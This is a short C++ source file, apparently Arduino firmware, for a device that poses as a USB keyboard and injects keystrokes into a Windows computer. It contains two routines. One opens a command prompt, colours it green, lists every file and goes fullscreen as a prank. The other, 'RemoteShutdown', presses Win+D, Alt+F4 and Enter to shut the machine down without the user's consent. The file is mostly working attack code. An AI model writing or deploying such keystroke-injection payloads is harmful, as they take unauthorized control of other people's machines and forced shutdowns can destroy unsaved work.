#include "WirelessAttacks.h"

Keyboard_ USBKeyboard;


void Wireless_Attacks::init()
{
    Serial.begin(9600);
    USBKeyboard.begin();
}
void Wireless_Attacks::TEST_1()
{
    USBKeyboard.press(KEY_LEFT_GUI);
    USBKeyboard.press('r');
    delay(100);
    USBKeyboard.release(KEY_LEFT_GUI);
    USBKeyboard.print("cmd");
    USBKeyboard.press(KEY_RETURN);
    delay(100);
    USBKeyboard.release(KEY_RETURN);
    USBKeyboard.print("color a");
    USBKeyboard.press(KEY_RETURN);
    USBKeyboard.release(KEY_RETURN);
    USBKeyboard.print("dir/s");
    USBKeyboard.press(KEY_RETURN);
    USBKeyboard.release(KEY_RETURN);
    delay(5);
    USBKeyboard.press(KEY_F11);
    USBKeyboard.releaseAll();
}

void Wireless_Attacks::RemoteShutdown()
{
    USBKeyboard.press(KEY_LEFT_GUI);
    USBKeyboard.press('d');
    USBKeyboard.releaseAll();
    delay(2);
    USBKeyboard.press(KEY_LEFT_ALT);
    USBKeyboard.press(KEY_F4);
    delay(3);
    USBKeyboard.releaseAll();
    USBKeyboard.press(KEY_RETURN);
    USBKeyboard.releaseAll();
}
